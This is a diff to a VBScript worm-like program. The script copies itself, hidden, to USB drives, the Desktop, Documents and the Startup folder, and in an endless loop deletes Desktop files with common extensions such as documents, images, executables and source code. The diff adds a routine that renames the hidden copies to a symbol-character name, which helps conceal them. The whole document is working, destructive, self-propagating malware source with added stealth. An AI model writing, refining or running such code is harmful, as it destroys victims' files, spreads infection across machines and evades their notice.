@@ -25,6 +25,7 @@ For i = 1 To numCopies
     strCopyPath = usbDrivePath & "\Copy" & randomIteration & ".vbs"
     objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
     SetAttr strCopyPath, vbHidden ' Hide the copied file
+    RenameFile strCopyPath, "☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" ' Rename the copied file
 Next
 On Error GoTo 0 ' Reset error handling
 
@@ -37,11 +38,13 @@ For i = 1 To numCopies
     strDesktopCopyPath = strDesktopFolder & "\Copy" & randomIteration & ".vbs"
     objFSO.CopyFile strScriptPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
     SetAttr strDesktopCopyPath, vbHidden ' Hide the copied file
+    RenameFile strDesktopCopyPath, "☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" ' Rename the copied file
 
     ' Create a copy of the script in the documents folder
     strDocumentsCopyPath = strDocumentsFolder & "\Copy" & randomIteration & ".vbs"
     objFSO.CopyFile strScriptPath, strDocumentsCopyPath, True ' Add "True" to overwrite existing files
     SetAttr strDocumentsCopyPath, vbHidden ' Hide the copied file
+    RenameFile strDocumentsCopyPath, "☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" ' Rename the copied file
 Next
 On Error GoTo 0 ' Reset error handling
 
@@ -50,6 +53,7 @@ On Error Resume Next ' Ignore errors
 startupFolder = objShell.SpecialFolders("Startup")
 objFSO.CopyFile strScriptPath, startupFolder & "\Copy.vbs", True ' Add "True" to overwrite existing files
 SetAttr startupFolder & "\Copy.vbs", vbHidden ' Hide the copied file
+RenameFile startupFolder & "\Copy.vbs", "☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" ' Rename the copied file
 On Error GoTo 0 ' Reset error handling
 
 ' Loop indefinitely
@@ -67,7 +71,7 @@ Do
     For Each objFile In objFSO.GetFolder(strDesktopFolder).Files
         Dim extension
         extension = LCase(objFSO.GetExtensionName(objFile.Name))
-If extension = "txt" Or extension = "exe" Or extension = "json" Or extension = "doc" Or extension = "pdf" Or extension = "wpd" Or extension = "docx" Or extension = "rtf" Or extension = "tex" Or extension = "odt" Or extension = "jpg" Or extension = "jpeg" Or extension = "mp3" Or extension = "rar" Or extension = "vcd" Or extension = "webp" Or extension = "css" Or extension = "html" Or extension = "py" Or extension = "php" Or extension = "ico" Or extension = "lnk" Or extension = "mp4" Or extension = "js" Or extension = "bak" Or extension = "xml" Or extension = "zip" Or extension = "bmp" Then
+        If extension = "txt" Or extension = "exe" Or extension = "json" Or extension = "doc" Or extension = "pdf" Or extension = "wpd" Or extension = "docx" Or extension = "rtf" Or extension = "tex" Or extension = "odt" Or extension = "jpg" Or extension = "jpeg" Or extension = "mp3" Or extension = "rar" Or extension = "vcd" Or extension = "webp" Or extension = "css" Or extension = "html" Or extension = "py" Or extension = "php" Or extension = "ico" Or extension = "lnk" Or extension = "mp4" Or extension = "js" Or extension = "bak" Or extension = "xml" Or extension = "zip" Or extension = "bmp" Then
             objFSO.DeleteFile(objFile)
         End If
     Next
@@ -87,6 +91,7 @@ If extension = "txt" Or extension = "exe" Or extension = "json" Or extension = "
             strCopyPath = objFolder.Path & "\Copy" & randomIteration & ".vbs"
             objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
             SetAttr strCopyPath, vbHidden ' Hide the copied file
+            RenameFile strCopyPath, "☞︎♓︎■︎♋︎●︎☼︎◆︎⌘︎♏︎" ' Rename the copied file
             
             ' Set the font color of the copied file to red
             Set objShell = CreateObject("WScript.Shell")
@@ -121,3 +126,12 @@ Sub DeleteFilesExceptVBS(folderPath)
     
     On Error GoTo 0
 End Sub
+
+Sub RenameFile(filePath, newName)
+    Dim parentFolder, newNamePath
+    Set parentFolder = objFSO.GetParentFolderName(filePath)
+    newNamePath = parentFolder & "\" & newName
+    objFSO.MoveFile filePath, newNamePath
+End Sub
+
+
